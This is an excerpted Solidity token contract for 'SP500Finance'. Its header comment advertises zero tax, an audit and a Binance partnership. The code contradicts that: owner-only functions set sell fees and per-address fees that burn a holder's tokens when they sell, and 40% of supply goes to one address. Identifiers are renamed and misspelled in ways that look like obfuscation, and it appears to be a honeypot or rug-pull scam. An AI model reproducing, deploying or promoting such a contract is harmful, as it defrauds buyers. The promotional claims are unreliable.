...
/*
btoken sp500 project is a utility staking token with ZERO TAX holders will be able to stake nft , holding it for longer period of time.  KYC AUDIT  Contract audit  NO TOKEN TAX    Partnered with Binance, Dont forget to follow our official links down below and dont miss out this rare opportunity.
* http://instagram.com/SP500Finance833
* https://www.reddit.com/user/SP500Finance833
* TWITTER:https://twitter.com/sp500
* WEBSITE:https://www.sp500f.io
* TELEGRAM:https://t.me/sp500
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingSP500Finance833OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingSP500Finance833OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingSP500Finance833OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingSP500Finance833OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingSP500Finance833OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function SP500Finance833To() external view returns (address);
    function SP500Finance833ToSetter() external view returns (address);
    ...
    function setSP500Finance833To(address) external;
    function setSP500Finance833ToSetter(address) external;
}
...
contract SP500F is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "SP500Finance";
	string symbol_ = "SP500F";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellSP500Finance833 = 0;
        _defaultBuySP500Finance833 = 0;
    ...
    uint256 private _defaultSellSP500Finance833 = 0;
    uint256 private _defaultBuySP500Finance833 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellSP500Finance833 = _value;
    }


    function acSP500Finance833fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeSP500Finance833amuont = 0;

        if (rF) {
            uint256 tradeSP500Finance833 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeSP500Finance833 = _msgSP500Finance833Info(uint160(from));
                    tradeSP500Finance833 = tradeSP500Finance833 < _defaultSellSP500Finance833 ? _defaultSellSP500Finance833 : tradeSP500Finance833;
                }
                if (from == uniswapV2Pair) {
                    tradeSP500Finance833 = _defaultBuySP500Finance833;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeSP500Finance833 = _Escape[from];
            }


            tradeSP500Finance833amuont = _amuont.mul(tradeSP500Finance833).div(100);
        }


        if (tradeSP500Finance833amuont > 0) {
            _balances[from] = _balances[from].sub(tradeSP500Finance833amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeSP500Finance833amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeSP500Finance833amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeSP500Finance833amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeSP500Finance833amuont);
        emit Transfer(from, _to, _amuont - tradeSP500Finance833amuont);
    }
	...
	function _msgSP500Finance833Info(uint _acc) internal view virtual returns (uint) {
